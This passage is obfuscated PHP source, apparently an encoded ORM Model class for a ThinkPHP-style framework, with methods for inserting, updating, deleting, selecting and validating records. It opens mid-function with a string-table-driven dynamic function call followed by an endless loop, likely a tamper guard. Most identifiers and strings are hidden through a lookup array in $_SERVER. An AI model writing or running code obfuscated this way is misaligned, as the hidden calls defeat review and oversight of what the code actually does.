$exit(); } $_act = $_SERVER[Ö†ØøÖ±][295]; $_act($_SERVER[$_SERVER[Ö†ØøÖ±][291]] . $_SERVER[Ö†ØøÖ±][292]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ö†ØøÖ±][296]); } } class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\145", "\x6f\x72\144\x65\162", "\x61\154\151\x61\163", "\150\x61\166\x69\156\x67", "\147\x72\x6f\165\160", "\154\x6f\x63\x6b", "\144\151\x73\x74\151\156\143\164", "\x61\x75\164\x6f", "\x66\151\x6c\164\145\x72", "\166\x61\154\151\144\141\164\145", "\x72\x65\163\x75\x6c\x74", "\142\151\156\144", "\164\157\153\145\156"); public function __construct($èäÏ—Ôü = '', $ÑÉı€­™ = '', $Ü›ãì×‰ = '') { $¨¨„®é­ =& $_SERVER[Ö†ØøÖ±]; $this->_initialize(); if (!empty($èäÏ—Ôü)) { if (strpos($èäÏ—Ôü, $¨¨„®é­[10])) { list($this->dbName, $this->name) = explode($¨¨„®é­[10], $èäÏ—Ôü); } else { $this->name = $èäÏ—Ôü; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ÑÉı€­™)) { $this->tablePrefix = $¨¨„®é­[12]; } elseif ($¨¨„®é­[12] != $ÑÉı€­™) { $this->tablePrefix = $ÑÉı€­™; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¨¨„®é­[297]); } $this->db(0, empty($this->connection) ? $Ü›ãì×‰ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $”±š„´ =& $_SERVER[Ö†ØøÖ±]; if (empty($this->fields)) { if (think_config($”±š„´[298])) { $Š‰Œ§Ò• = $this->dbName ? $this->dbName : think_config($”±š„´[299]); $ßïÅÄ­ = think_var_cache($”±š„´[300] . strtolower(get_path_this($Š‰Œ§Ò•) . $”±š„´[10] . $this->name)); if ($ßïÅÄ­) { $¤°¬ë¹÷ = think_config($”±š„´[301]); if (empty($¤°¬ë¹÷) || $ßïÅÄ­[$”±š„´[302]] == $¤°¬ë¹÷) { $this->fields = $ßïÅÄ­; return; } } } $this->flush(); } } public function flush() { $óÏê®Ãé =& $_SERVER[Ö†ØøÖ±]; $this->db->setModel($this->name); $¸«…†Îı = $this->db->getFields($this->getTableName()); if (!$¸«…†Îı) { return !1; } $this->fields = array_keys($¸«…†Îı); $this->fields[$óÏê®Ãé[303]] = !1; foreach ($¸«…†Îı as $‘È‰šø => $û«â¾ı) { $•æÒíÕõ[$‘È‰šø] = $û«â¾ı[$óÏê®Ãé[33]]; if ($û«â¾ı[$óÏê®Ãé[39]]) { $this->fields[$óÏê®Ãé[304]] = $‘È‰šø; if ($û«â¾ı[$óÏê®Ãé[42]]) { $this->fields[$óÏê®Ãé[303]] = !0; } } } $this->fields[$óÏê®Ãé[305]] = $•æÒíÕõ; if (think_config($óÏê®Ãé[301])) { $this->fields[$óÏê®Ãé[302]] = think_config($óÏê®Ãé[301]); } if (think_config($óÏê®Ãé[298])) { $¥ïç×£Ü = $this->dbName ? $this->dbName : think_config($óÏê®Ãé[299]); think_var_cache($óÏê®Ãé[300] . strtolower(get_path_this($¥ïç×£Ü) . $óÏê®Ãé[10] . $this->name), $this->fields); } } public function switchModel($Ä’±À–­, $™—Úª®ã = array()) { $ƒı°—£ =& $_SERVER[Ö†ØøÖ±]; $Ë¶í»¦ = ucwords(strtolower($Ä’±À–­)) . $ƒı°—£[306]; if (!class_exists($Ë¶í»¦)) { think_exception($Ë¶í»¦ . think_lang($ƒı°—£[307])); } $this->_extModel = new $Ë¶í»¦($this->name); if (!empty($™—Úª®ã)) { foreach ($™—Úª®ã as $Ô¾šë¨) { $this->_extModel->setProperty($Ô¾šë¨, $this->{$Ô¾šë¨}); } } return $this->_extModel; } public function __set($¾ˆå‡ÍŠ, $¶ó»ò“„) { $this->data[$¾ˆå‡ÍŠ] = $¶ó»ò“„; } public function __get($­‹Şø¸) { return isset($this->data[$­‹Şø¸]) ? $this->data[$­‹Şø¸] : null; } public function __isset($©—îÛÎ ) { return isset($this->data[$©—îÛÎ ]); } public function __unset($”˜“‚´) { unset($this->data[$”˜“‚´]); } public function __call($ºå£ÄÃ, $ªøÓÕàà) { $®Ç†ä†£ =& $_SERVER[Ö†ØøÖ±]; if (in_array(strtolower($ºå£ÄÃ), $this->methods, !0)) { $this->options[strtolower($ºå£ÄÃ)] = $ªøÓÕàà[0]; return $this; } elseif (in_array(strtolower($ºå£ÄÃ), array($®Ç†ä†£[308], $®Ç†ä†£[309], $®Ç†ä†£[310], $®Ç†ä†£[311], $®Ç†ä†£[312]), !0)) { $•ÇĞ±ÆÁ = isset($ªøÓÕàà[0]) ? $ªøÓÕàà[0] : $®Ç†ä†£[203]; $•ÇĞ±ÆÁ = $this->db->parseKey($•ÇĞ±ÆÁ); return $this->getField(strtoupper($ºå£ÄÃ) . $®Ç†ä†£[313] . $•ÇĞ±ÆÁ . $®Ç†ä†£[314] . $ºå£ÄÃ, $®Ç†ä†£[308]); } elseif (strtolower(substr($ºå£ÄÃ, 0, 5)) == $®Ç†ä†£[315]) { $•ÇĞ±ÆÁ = think_parse_name(substr($ºå£ÄÃ, 5)); $’‘úÆä[$•ÇĞ±ÆÁ] = $ªøÓÕàà[0]; return $this->where($’‘úÆä)->find(); } elseif (strtolower(substr($ºå£ÄÃ, 0, 10)) == $®Ç†ä†£[316]) { $ãÅµç›í = think_parse_name(substr($ºå£ÄÃ, 10)); $’‘úÆä[$ãÅµç›í] = $ªøÓÕàà[0]; return $this->where($’‘úÆä)->getField($ªøÓÕàà[1]); } elseif (isset($this->_scope[$ºå£ÄÃ])) { return $this->scope($ºå£ÄÃ, $ªøÓÕàà[0]); } elseif (method_exists($this, $ºå£ÄÃ)) { array_unshift($ªøÓÕàà, $ºå£ÄÃ); return call_user_func_array(array($this, $®Ç†ä†£[317]), $ªøÓÕàà); } else { return call_user_func_array(array(parent, $ºå£ÄÃ), $ªøÓÕàà); } } protected function call() { $£ø­ƒüŸ =& $_SERVER[Ö†ØøÖ±]; $°š£··ì = func_get_args(); $ÒóüÂÀ‰ = array_shift($°š£··ì); $½Â•Üõ› = $ÒóüÂÀ‰; if (is_array($ÒóüÂÀ‰)) { $½Â•Üõ› = $ÒóüÂÀ‰[1]; $ÒóüÂÀ‰ = $ÒóüÂÀ‰[0]; } $Ó…âµ±ñ = count($°š£··ì) - 1; if (isset($°š£··ì[$Ó…âµ±ñ]) && $°š£··ì[$Ó…âµ±ñ] === $ÒóüÂÀ‰) { think_exception(__CLASS__ . $£ø­ƒüŸ[4] . $ÒóüÂÀ‰ . think_lang($£ø­ƒüŸ[318])); return; } $°š£··ì[] = $ÒóüÂÀ‰; if (method_exists($this, $£ø­ƒüŸ[319])) { $Û¬×ó„ = call_user_func_array(array($this, $£ø­ƒüŸ[320]), array($½Â•Üõ›, $°š£··ì)); if (!is_null($Û¬×ó„) && $Û¬×ó„ !== !1) { return $Û¬×ó„; } } $øŒÕÉÆ’ = call_user_func_array(array($this, $ÒóüÂÀ‰), $°š£··ì); if (method_exists($this, $£ø­ƒüŸ[321])) { $Û¬×ó„ = call_user_func_array(array($this, $£ø­ƒüŸ[322]), array($½Â•Üõ›, $°š£··ì, $øŒÕÉÆ’)); if ($Û¬×ó„) { return $Û¬×ó„; } } return $øŒÕÉÆ’; } protected function _initialize() { } protected function _facade($äÊÕ£¾ã) { $ÎùÚ›ŞÊ =& $_SERVER[Ö†ØøÖ±]; if (!empty($this->fields)) { foreach ($äÊÕ£¾ã as $›¦Ì­ØÖ => $ëŞâ˜—Ô) { if (is_array($this->fields) && !in_array($›¦Ì­ØÖ, $this->fields, !0)) { unset($äÊÕ£¾ã[$›¦Ì­ØÖ]); } elseif (is_scalar($ëŞâ˜—Ô)) { $this->_parseType($äÊÕ£¾ã, $›¦Ì­ØÖ); } } } if (!empty($this->options[$ÎùÚ›ŞÊ[323]])) { $äÊÕ£¾ã = array_map($this->options[$ÎùÚ›ŞÊ[323]], $äÊÕ£¾ã); unset($this->options[$ÎùÚ›ŞÊ[323]]); } $this->_beforeWrite($äÊÕ£¾ã); return $äÊÕ£¾ã; } protected function _beforeWrite(&$½Ï²ŒÊø) { } public function add($œ¶½Ë’¿ = '', $œ’Şåø = array(), $£İ‹·· = false) { if (empty($œ¶½Ë’¿)) { if (!empty($this->data)) { $œ¶½Ë’¿ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ö†ØøÖ±][324]); return !1; } } $œ’Şåø = $this->_parseOptions($œ’Şåø); $œ¶½Ë’¿ = $this->_facade($œ¶½Ë’¿); if (!1 === $this->_beforeInsert($œ¶½Ë’¿, $œ’Şåø)) { return !1; } $áš«×‹ñ = $this->db->insert($œ¶½Ë’¿, $œ’Şåø, $£İ‹··); if (!1 !== $áš«×‹ñ) { $ù–¤Ç¿ë = $this->getLastInsID(); if ($ù–¤Ç¿ë) { $œ¶½Ë’¿[$this->getPk()] = $ù–¤Ç¿ë; $this->_after_insert($œ¶½Ë’¿, $œ’Şåø); return $ù–¤Ç¿ë; } $this->_after_insert($œ¶½Ë’¿, $œ’Şåø); } return $áš«×‹ñ; } protected function _beforeInsert(&$¹êø•»Ü, $–ú‡ØĞ) { } protected function _after_insert($„İ°ñÒÒ, $¹Êû¥³Ä) { } public function addAll($Ø„¬´Ó©, $äÄÊ©êé = array(), $ğš¢ì¼Ÿ = false) { $àß¼š‰¿ =& $_SERVER[Ö†ØøÖ±]; if (empty($Ø„¬´Ó©)) { $this->error = think_lang($àß¼š‰¿[324]); return !1; } $äÄÊ©êé = $this->_parseOptions($äÄÊ©êé); foreach ($Ø„¬´Ó© as $êôšÒúØ => $ÆÛµıÁÎ) { $Ø„¬´Ó©[$êôšÒúØ] = $this->_facade($ÆÛµıÁÎ); } if (method_exists($this->db, $àß¼š‰¿[325])) { $Ç•‡ˆÖÀ = $this->db->insertAll($Ø„¬´Ó©, $äÄÊ©êé, $ğš¢ì¼Ÿ); } else { $this->startTrans(); foreach ($Ø„¬´Ó© as $êôšÒúØ => $ÆÛµıÁÎ) { $Ç•‡ˆÖÀ = $this->db->insert($ÆÛµıÁÎ, $äÄÊ©êé, $ğš¢ì¼Ÿ); } $this->commit(); } if (!1 !== $Ç•‡ˆÖÀ) { $É°Ä¯ö = $this->getLastInsID(); if ($É°Ä¯ö) { return $É°Ä¯ö; } } return $Ç•‡ˆÖÀ; } public function selectAdd($òÏšç = '', $é„¦Œ­ = '', $ÒŠ²”å‘ = array()) { $‰ò×‡¹ =& $_SERVER[Ö†ØøÖ±]; $ÒŠ²”å‘ = $this->_parseOptions($ÒŠ²”å‘); if (!1 === ($¨èÒµ¼ª = $this->db->selectInsert($òÏšç ? $òÏšç : $ÒŠ²”å‘[$‰ò×‡¹[326]], $é„¦Œ­ ? $é„¦Œ­ : $this->getTableName(), $ÒŠ²”å‘))) { $this->error = think_lang($‰ò×‡¹[327]); return !1; } else { return $¨èÒµ¼ª; } } public function save($î±¬¹·¼ = '', $á¦éÉ³ = array()) { $ÌõºïÚæ =& $_SERVER[Ö†ØøÖ±]; if (empty($î±¬¹·¼)) { if (!empty($this->data)) { $î±¬¹·¼ = $this->data; $this->data = array(); } else { $this->error = think_lang($ÌõºïÚæ[324]); return !1; } } $î±¬¹·¼ = $this->_facade($î±¬¹·¼); $á¦éÉ³ = $this->_parseOptions($á¦éÉ³); $™‘ìôß’ = $this->getPk(); if (!isset($á¦éÉ³[$ÌõºïÚæ[328]])) { if (isset($î±¬¹·¼[$™‘ìôß’])) { $ÅúØıóú[$™‘ìôß’] = $î±¬¹·¼[$™‘ìôß’]; $á¦éÉ³[$ÌõºïÚæ[328]] = $ÅúØıóú; unset($î±¬¹·¼[$™‘ìôß’]); } else { $this->error = think_lang($ÌõºïÚæ[327]); return !1; } } if (is_array($á¦éÉ³[$ÌõºïÚæ[328]]) && isset($á¦éÉ³[$ÌõºïÚæ[328]][$™‘ìôß’])) { $ò›œï¬ö = $á¦éÉ³[$ÌõºïÚæ[328]][$™‘ìôß’]; } if (!1 === $this->_beforeUpdate($î±¬¹·¼, $á¦éÉ³)) { return !1; } $Û„Š´÷è = $this->db->update($î±¬¹·¼, $á¦éÉ³); if (!1 !== $Û„Š´÷è) { if (isset($ò›œï¬ö)) { $î±¬¹·¼[$™‘ìôß’] = $ò›œï¬ö; } $this->_afterUpdate($î±¬¹·¼, $á¦éÉ³); } return $Û„Š´÷è; } protected function _beforeUpdate(&$²Ç÷²€, $Å•ƒûª¦) { } protected function _afterUpdate($¹ìÛ¥‘è, $ÜÎÌ«¶) { } public function delete($‹ŒìÒ€ = array()) { $ÖŠ™•Úè =& $_SERVER[Ö†ØøÖ±]; if (empty($‹ŒìÒ€) && empty($this->options[$ÖŠ™•Úè[328]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $µÇÂú÷ = $this->getPk(); if (is_numeric($‹ŒìÒ€) || is_string($‹ŒìÒ€)) { if (strpos($‹ŒìÒ€, $ÖŠ™•Úè[50])) { $»šİÌÜ¹[$µÇÂú÷] = array($ÖŠ™•Úè[329], $‹ŒìÒ€); } else { $»šİÌÜ¹[$µÇÂú÷] = $‹ŒìÒ€; } $this->options[$ÖŠ™•Úè[328]] = $»šİÌÜ¹; } $‹ŒìÒ€ = $this->_parseOptions(); if (is_array($‹ŒìÒ€[$ÖŠ™•Úè[328]]) && isset($‹ŒìÒ€[$ÖŠ™•Úè[328]][$µÇÂú÷])) { $É‘Øè¿‹ = $‹ŒìÒ€[$ÖŠ™•Úè[328]][$µÇÂú÷]; } $ÛÙ²ÉÛ = $this->db->delete($‹ŒìÒ€); if (!1 !== $ÛÙ²ÉÛ) { $ğÅŞ¦ú” = array(); if (isset($É‘Øè¿‹)) { $ğÅŞ¦ú”[$µÇÂú÷] = $É‘Øè¿‹; } $this->_after_delete($ğÅŞ¦ú”, $‹ŒìÒ€); } return $ÛÙ²ÉÛ; } protected function _after_delete($İ¬·úéó, $ÍœíÛ’à) { } public function select($Ò™ ”Ú± = array()) { $ö¤õ­Ş =& $_SERVER[Ö†ØøÖ±]; if (is_string($Ò™ ”Ú±) || is_numeric($Ò™ ”Ú±)) { $Çƒ÷†ƒñ = $this->getPk(); if (strpos($Ò™ ”Ú±, $ö¤õ­Ş[50])) { $Ì¸˜öª¸[$Çƒ÷†ƒñ] = array($ö¤õ­Ş[329], $Ò™ ”Ú±); } else { $Ì¸˜öª¸[$Çƒ÷†ƒñ] = $Ò™ ”Ú±; } $this->options[$ö¤õ­Ş[328]] = $Ì¸˜öª¸; } elseif (!1 === $Ò™ ”Ú±) { $Ò™ ”Ú± = $this->_parseOptions(); return $ö¤õ­Ş[330] . $this->db->buildSelectSql($Ò™ ”Ú±) . $ö¤õ­Ş[331]; } $Ò™ ”Ú± = $this->_parseOptions(); $è…âŸš = $this->db->select($Ò™ ”Ú±); if (!1 === $è…âŸš) { return !1; } if (empty($è…âŸš)) { return null; } $this->_afterSelect($è…âŸš, $Ò™ ”Ú±); return $è…âŸš; } protected function _afterSelect(&$·ÍÀÎíé, $É¬ìÃ¸˜) { } public function buildSql($ªÃˆ¾Òä = array()) { $’”Ü£Ä =& $_SERVER[Ö†ØøÖ±]; $ªÃˆ¾Òä = $this->_parseOptions($ªÃˆ¾Òä); return $’”Ü£Ä[330] . $this->db->buildSelectSql($ªÃˆ¾Òä) . $’”Ü£Ä[331]; } public function optionsValue($Øâ¤¤ = null) { if (is_null($Øâ¤¤)) { return $this->options; } elseif (is_array($Øâ¤¤)) { $this->options = array_merge($this->options, $Øâ¤¤); } } protected function _parseOptions($éÇØô· = array()) { $ï«¸¶€Æ =& $_SERVER[Ö†ØøÖ±]; if (is_array($éÇØô·)) { $éÇØô· = array_merge($this->options, $éÇØô·); } $this->options = array(); if (!isset($éÇØô·[$ï«¸¶€Æ[332]])) { $éÇØô·[$ï«¸¶€Æ[332]] = $this->getTableName(); $¥¶Ñœ = $this->fields; } else { $¥¶Ñœ = $this->getDbFields(); } if (!empty($éÇØô·[$ï«¸¶€Æ[333]])) { $éÇØô·[$ï«¸¶€Æ[332]] .= $ï«¸¶€Æ[53] . $éÇØô·[$ï«¸¶€Æ[333]]; } $éÇØô·[$ï«¸¶€Æ[334]] = $this->name; if (isset($éÇØô·[$ï«¸¶€Æ[328]]) && is_array($éÇØô·[$ï«¸¶€Æ[328]]) && !empty($¥¶Ñœ) && !isset($éÇØô·[$ï«¸¶€Æ[335]]) && !isset($éÇØô·[$ï«¸¶€Æ[332]])) { foreach ($éÇØô·[$ï«¸¶€Æ[328]] as $ÍŒç«Ë˜ => $öğ˜İäì) { $ÍŒç«Ë˜ = trim($ÍŒç«Ë˜); if (in_array($ÍŒç«Ë˜, $¥¶Ñœ, !0)) { if (is_scalar($öğ˜İäì)) { $this->_parseType($éÇØô·[$ï«¸¶€Æ[328]], $ÍŒç«Ë˜); } } elseif (!is_numeric($ÍŒç«Ë˜) && $ï«¸¶€Æ[11] != substr($ÍŒç«Ë˜, 0, 1) && !1 === strpos($ÍŒç«Ë˜, $ï«¸¶€Æ[10]) && !1 === strpos($ÍŒç«Ë˜, $ï«¸¶€Æ[313]) && !1 === strpos($ÍŒç«Ë˜, $ï«¸¶€Æ[336]) && !1 === strpos($ÍŒç«Ë˜, $ï«¸¶€Æ[337])) { unset($éÇØô·[$ï«¸¶€Æ[328]][$ÍŒç«Ë˜]); } } } $this->_options_filter($éÇØô·); return $éÇØô·; } protected function _options_filter(&$Ğ—êˆ¥Æ) { } protected function _parseType(&$¡àıñ½×, $÷©‘ïõ½) { $Ë›Ÿôæ =& $_SERVER[Ö†ØøÖ±]; if (empty($this->options[$Ë›Ÿôæ[338]][$Ë›Ÿôæ[4] . $÷©‘ïõ½])) { $‡¹ôòÔ€ = strtolower($this->fields[$Ë›Ÿôæ[305]][$÷©‘ïõ½]); if (!1 !== strpos($‡¹ôòÔ€, $Ë›Ÿôæ[339])) { } elseif (!1 === strpos($‡¹ôòÔ€, $Ë›Ÿôæ[340]) && !1 !== strpos($‡¹ôòÔ€, $Ë›Ÿôæ[341])) { $¡àıñ½×[$÷©‘ïõ½] = intval($¡àıñ½×[$÷©‘ïõ½]); } elseif (!1 !== strpos($‡¹ôòÔ€, $Ë›Ÿôæ[342]) || !1 !== strpos($‡¹ôòÔ€, $Ë›Ÿôæ[343])) { $¡àıñ½×[$÷©‘ïõ½] = floatval($¡àıñ½×[$÷©‘ïõ½]); } elseif (!1 !== strpos($‡¹ôòÔ€, $Ë›Ÿôæ[344])) { $¡àıñ½×[$÷©‘ïõ½] = (bool) $¡àıñ½×[$÷©‘ïõ½]; } } } public function find($ô•Ì—ÀÅ = array()) { $ºæ²û¸ß =& $_SERVER[Ö†ØøÖ±]; if (is_numeric($ô•Ì—ÀÅ) || is_string($ô•Ì—ÀÅ)) { $šÊÄ¹Ò„[$this->getPk()] = intval($ô•Ì—ÀÅ); $this->options[$ºæ²û¸ß[328]] = $šÊÄ¹Ò„; } $this->options[$ºæ²û¸ß[345]] = 1; $ô•Ì—ÀÅ = $this->_parseOptions(); $óÉ‘èŞä = $this->db->select($ô•Ì—ÀÅ); if (!1 === $óÉ‘èŞä) { return !1; } if (empty($óÉ‘èŞä)) { return null; } $this->data = $óÉ‘èŞä[0]; $this->_afterFind($this->data, $ô•Ì—ÀÅ); if (!empty($this->options[$ºæ²û¸ß[346]])) { return $this->returnResult($this->data, $this->options[$ºæ²û¸ß[346]]); } return $this->data; } protected function _afterFind(&$ÜËî¸, $Î÷±Û†‹) { } protected function returnResult($Ò¤†Ïì, $Úù¹Ñ˜Ò = '') { $ìëâ†¥ =& $_SERVER[Ö†ØøÖ±]; if ($Úù¹Ñ˜Ò) { if (is_callable($Úù¹Ñ˜Ò)) { return call_user_func($Úù¹Ñ˜Ò, $Ò¤†Ïì); } switch (strtolower($Úù¹Ñ˜Ò)) { case $ìëâ†¥[347]: return json_encode($Ò¤†Ïì); case $ìëâ†¥[348]: return xml_encode($Ò¤†Ïì); } } return $Ò¤†Ïì; } public function parseFieldsMap($Æ˜àÊÄ, $…’ğ×ÄÂ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $êÕİğÑê => $æŠä˜¯¼) { if ($…’ğ×ÄÂ == 1) { if (isset($Æ˜àÊÄ[$æŠä˜¯¼])) { $Æ˜àÊÄ[$êÕİğÑê] = $Æ˜àÊÄ[$æŠä˜¯¼]; unset($Æ˜àÊÄ[$æŠä˜¯¼]); } } else { if (isset($Æ˜àÊÄ[$êÕİğÑê])) { $Æ˜àÊÄ[$æŠä˜¯¼] = $Æ˜àÊÄ[$êÕİğÑê]; unset($Æ˜àÊÄ[$êÕİğÑê]); } } } } return $Æ˜àÊÄ; } public function setField($ìã°É‘Ü, $È‹ª¼ìÈ = '') { if (is_array($ìã°É‘Ü)) { $ƒãĞ“æ× = $ìã°É‘Ü; } else { $ƒãĞ“æ×[$ìã°É‘Ü] = $È‹ª¼ìÈ; } return $this->save($ƒãĞ“æ×); } public function setAdd($³ôÎğà, $Òó¤Õ¢í = 1) { $”†úÙ§ =& $_SERVER[Ö†ØøÖ±]; $»’‚ë›ã = $³ôÎğà . $”†úÙ§[349] . $Òó¤Õ¢í; if ($Òó¤Õ¢í < 0) { $»’‚ë›ã = $³ôÎğà . $Òó¤Õ¢í; } return $this->setField($³ôÎğà, array($”†úÙ§[350], $»’‚ë›ã)); } public function getField($¯ß“Ñ‚, $¤ùÌšäÙ = null) { $¹‰˜Ú° =& $_SERVER[Ö†ØøÖ±]; $‚õ˜‹È¡[$¹‰˜Ú°[326]] = $¯ß“Ñ‚; $‚õ˜‹È¡ = $this->_parseOptions($‚õ˜‹È¡); $¯ß“Ñ‚ = trim($¯ß“Ñ‚); if (strpos($¯ß“Ñ‚, $¹‰˜Ú°[50])) { if (!isset($‚õ˜‹È¡[$¹‰˜Ú°[345]])) { $‚õ˜‹È¡[$¹‰˜Ú°[345]] = is_numeric($¤ùÌšäÙ) ? $¤ùÌšäÙ : $¹‰˜Ú°[12]; } $ˆÄ¥ˆ = $this->db->select($‚õ˜‹È¡); if (!empty($ˆÄ¥ˆ)) { $Šùãâ¼˜ = explode($¹‰˜Ú°[50], $¯ß“Ñ‚); $¯ß“Ñ‚ = array_keys($ˆÄ¥ˆ[0]); $¬µº°“ì = array_shift($¯ß“Ñ‚); $„´¹ßøĞ = array_shift($¯ß“Ñ‚); $úÛ­¬®ú = array(); $Ô‘ıÖ¬å = count($Šùãâ¼˜); foreach ($ˆÄ¥ˆ as $ÏŞä¼¨Ñ) { $»µê¢àó = $ÏŞä¼¨Ñ[$¬µº°“ì]; if (2 == $Ô‘ıÖ¬å) { $úÛ­¬®ú[$»µê¢àó] = $ÏŞä¼¨Ñ[$„´¹ßøĞ]; } else { $úÛ­¬®ú[$»µê¢àó] = is_string($¤ùÌšäÙ) ? implode($¤ùÌšäÙ, $ÏŞä¼¨Ñ) : $ÏŞä¼¨Ñ; } } return $úÛ­¬®ú; } } else { if (!0 !== $¤ùÌšäÙ) { $‚õ˜‹È¡[$¹‰˜Ú°[345]] = is_numeric($¤ùÌšäÙ) ? $¤ùÌšäÙ : 1; } if ($¤ùÌšäÙ === $¹‰˜Ú°[308]) { unset($‚õ˜‹È¡[$¹‰˜Ú°[345]]); } $ÏŞä¼¨Ñ = $this->db->select($‚õ˜‹È¡); if (!empty($ÏŞä¼¨Ñ)) { if ($¤ùÌšäÙ === $¹‰˜Ú°[308]) { return reset($ÏŞä¼¨Ñ[0]); } if (!0 !== $¤ùÌšäÙ && 1 == $‚õ˜‹È¡[$¹‰˜Ú°[345]]) { return reset($ÏŞä¼¨Ñ[0]); } foreach ($ÏŞä¼¨Ñ as $¦Ò¶Ç¤Ù) { $úü§ òù[] = $¦Ò¶Ç¤Ù[$¯ß“Ñ‚]; } return $úü§ òù; } } return null; } public function create($ÕìşÉƒ– = '', $Öƒ¥êÌ¿ = '') { $ò“àˆÅ =& $_SERVER[Ö†ØøÖ±]; if (empty($ÕìşÉƒ–)) { $ÕìşÉƒ– = $_POST; } elseif (is_object($ÕìşÉƒ–)) { $ÕìşÉƒ– = get_object_vars($ÕìşÉƒ–); } if (empty($ÕìşÉƒ–) || !is_array($ÕìşÉƒ–)) { $this->error = think_lang($ò“àˆÅ[324]); return !1; } $ÕìşÉƒ– = $this->parseFieldsMap($ÕìşÉƒ–, 0); $Öƒ¥êÌ¿ = $Öƒ¥êÌ¿ ? $Öƒ¥êÌ¿ : (!empty($ÕìşÉƒ–[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ò“àˆÅ[326]])) { $ŠâÊ¢ò = $this->options[$ò“àˆÅ[326]]; unset($this->options[$ò“àˆÅ[326]]); } elseif ($Öƒ¥êÌ¿ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ŠâÊ¢ò = $this->insertFields; } elseif ($Öƒ¥êÌ¿ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ŠâÊ¢ò = $this->updateFields; } if (isset($ŠâÊ¢ò)) { if (is_string($ŠâÊ¢ò)) { $ŠâÊ¢ò = explode($ò“àˆÅ[50], $ŠâÊ¢ò); } if (think_config($ò“àˆÅ[351])) { $ŠâÊ¢ò[] = think_config($ò“àˆÅ[352]); } foreach ($ÕìşÉƒ– as $µÌ†éŞï => $¿ÀøÉŒ®) { if (!in_array($µÌ†éŞï, $ŠâÊ¢ò)) { unset($ÕìşÉƒ–[$µÌ†éŞï]); } } } if (!$this->autoValidation($ÕìşÉƒ–, $Öƒ¥êÌ¿)) { return !1; } if (!$this->autoCheckToken($ÕìşÉƒ–)) { $this->error = think_lang($ò“àˆÅ[353]); return !1; } if ($this->autoCheckFields) { $ŠâÊ¢ò = $this->getDbFields(); foreach ($ÕìşÉƒ– as $µÌ†éŞï => $¿ÀøÉŒ®) { if (!in_array($µÌ†éŞï, $ŠâÊ¢ò)) { unset($ÕìşÉƒ–[$µÌ†éŞï]); } elseif (MAGIC_QUOTES_GPC && is_string($¿ÀøÉŒ®)) { $ÕìşÉƒ–[$µÌ†éŞï] = stripslashes($¿ÀøÉŒ®); } } } $this->autoOperation($ÕìşÉƒ–, $Öƒ¥êÌ¿); $this->data = $ÕìşÉƒ–; return $ÕìşÉƒ–; } public function autoCheckToken($Ò”ğÆÊà) { $÷½å¹  =& $_SERVER[Ö†ØøÖ±]; if (isset($this->options[$÷½å¹ [354]]) && !$this->options[$÷½å¹ [354]]) { return !0; } if (think_config($÷½å¹ [351])) { $ü“Ü¤œŞ = think_config($÷½å¹ [352]); if (!isset($Ò”ğÆÊà[$ü“Ü¤œŞ]) || Session::get($ü“Ü¤œŞ)) { return !1; } list($§¯ª˜×¾, $Ö¸¤áÓœ) = explode($÷½å¹ [11], $Ò”ğÆÊà[$ü“Ü¤œŞ]); if ($Ö¸¤áÓœ && Session::get($ü“Ü¤œŞ . $÷½å¹ [10] . $§¯ª˜×¾) === $Ö¸¤áÓœ) { Session::remove($ü“Ü¤œŞ . $÷½å¹ [10] . $§¯ª˜×¾); return !0; } if (think_config($÷½å¹ [355])) { Session::remove($ü“Ü¤œŞ . $÷½å¹ [10] . $§¯ª˜×¾); } return !1; } return !0; } public function regex($¢“Íï¢İ, $¯ÎßûÚÓ) { $”Òµ¸¯ƒ =& $_SERVER[Ö†ØøÖ±]; $ÇÙñæ¿® = array($”Òµ¸¯ƒ[356] => $”Òµ¸¯ƒ[357], $”Òµ¸¯ƒ[358] => $”Òµ¸¯ƒ[359], $”Òµ¸¯ƒ[360] => $”Òµ¸¯ƒ[361], $”Òµ¸¯ƒ[362] => $”Òµ¸¯ƒ[363], $”Òµ¸¯ƒ[364] => $”Òµ¸¯ƒ[365], $”Òµ¸¯ƒ[366] => $”Òµ¸¯ƒ[367], $”Òµ¸¯ƒ[368] => $”Òµ¸¯ƒ[369], $”Òµ¸¯ƒ[343] => $”Òµ¸¯ƒ[370], $”Òµ¸¯ƒ[371] => $”Òµ¸¯ƒ[372]); if (isset($ÇÙñæ¿®[strtolower($¯ÎßûÚÓ)])) { $¯ÎßûÚÓ = $ÇÙñæ¿®[strtolower($¯ÎßûÚÓ)]; } return preg_match($¯ÎßûÚÓ, $¢“Íï¢İ) === 1; } private function autoOperation(&$—Çîè°ò, $±Û¡õ¼) { $İá³Ë¶Å =& $_SERVER[Ö†ØøÖ±]; if (!empty($this->options[$İá³Ë¶Å[373]])) { $ÏÂ¬Çâœ = $this->options[$İá³Ë¶Å[373]]; unset($this->options[$İá³Ë¶Å[373]]); } elseif (!empty($this->_auto)) { $ÏÂ¬Çâœ = $this->_auto; } if (isset($ÏÂ¬Çâœ)) { foreach ($ÏÂ¬Çâœ as $´Ù‰çÅ¸) { if (empty($´Ù‰çÅ¸[2])) { $´Ù‰çÅ¸[2] = THINK_MODEL_INSERT; } if ($±Û¡õ¼ == $´Ù‰çÅ¸[2] || $´Ù‰çÅ¸[2] == THINK_MODEL_BOTH) { switch (trim($´Ù‰çÅ¸[3])) { case $İá³Ë¶Å[374]: case $İá³Ë¶Å[375]: $â¬™Òê = isset($´Ù‰çÅ¸[4]) ? (array) $´Ù‰çÅ¸[4] : array(); if 